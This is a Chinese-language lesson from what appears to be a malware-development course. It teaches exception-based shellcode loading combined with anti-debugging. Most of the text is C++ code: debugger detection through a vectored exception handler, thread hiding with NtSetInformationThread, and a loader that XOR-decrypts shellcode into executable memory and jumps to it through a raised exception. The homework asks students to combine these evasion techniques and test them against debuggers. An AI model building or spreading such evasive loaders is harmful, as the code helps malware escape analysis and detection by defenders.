# 课时39：补充异常ShellCode加载和反调试方法

## 1. 课程目标

结合异常处理与反调试技术，实现更隐蔽的ShellCode执行。

---

## 2. 异常反调试

### 2.1 利用异常检测调试器

```cpp
#include <windows.h>

BOOL g_bDebugged = TRUE;

LONG CALLBACK DebugDetectHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        g_bDebugged = FALSE;  // 异常被处理，说明没有调试器
        
        // 跳过int3指令
#ifdef _WIN64
        pExInfo->ContextRecord->Rip++;
#else
        pExInfo->ContextRecord->Eip++;
#endif
        
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL IsDebuggerPresentViaException() {
    AddVectoredExceptionHandler(1, DebugDetectHandler);
    
    __try {
        __debugbreak();  // int3
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // 如果走到这里，说明VEH没处理，可能被调试
        g_bDebugged = TRUE;
    }
    
    return g_bDebugged;
}
```

### 2.2 NtSetInformationThread隐藏

```cpp
typedef NTSTATUS(NTAPI* pNtSetInformationThread)(
    HANDLE, THREADINFOCLASS, PVOID, ULONG);

void HideFromDebugger() {
    pNtSetInformationThread NtSetInformationThread = 
        (pNtSetInformationThread)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtSetInformationThread");
    
    // ThreadHideFromDebugger = 0x11
    NtSetInformationThread(GetCurrentThread(), (THREADINFOCLASS)0x11, NULL, 0);
}
```

---

## 3. 组合技术

```cpp
#include <windows.h>

unsigned char encrypted_shellcode[] = { /* 加密的ShellCode */ };
LPVOID pShellcode = NULL;

LONG CALLBACK CombinedHandler(PEXCEPTION_POINTERS pExInfo) {
    // 1. 反调试检测
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // 2. 解密ShellCode
    for (int i = 0; i < sizeof(encrypted_shellcode); i++) {
        ((LPBYTE)pShellcode)[i] = encrypted_shellcode[i] ^ 0x55;
    }
    
    // 3. 修改执行流程
#ifdef _WIN64
    pExInfo->ContextRecord->Rip = (DWORD64)pShellcode;
#else
    pExInfo->ContextRecord->Eip = (DWORD)pShellcode;
#endif
    
    return EXCEPTION_CONTINUE_EXECUTION;
}

int main() {
    // 隐藏线程
    HideFromDebugger();
    
    // 准备内存
    pShellcode = VirtualAlloc(NULL, sizeof(encrypted_shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    
    // 注册异常处理
    AddVectoredExceptionHandler(1, CombinedHandler);
    
    // 触发异常
    RaiseException(EXCEPTION_ACCESS_VIOLATION, 0, 0, NULL);
    
    return 0;
}
```

---

## 4. 课后作业

### 作业1：异常反调试（必做）

1. 实现基于异常的调试器检测
2. 结合ShellCode执行

### 作业2：组合技术（进阶）

1. 将多种反调试技术组合
2. 测试对不同调试器的效果

---

## 5. 下一课预告

下一课我们将补充基础ShellCode加载方式。
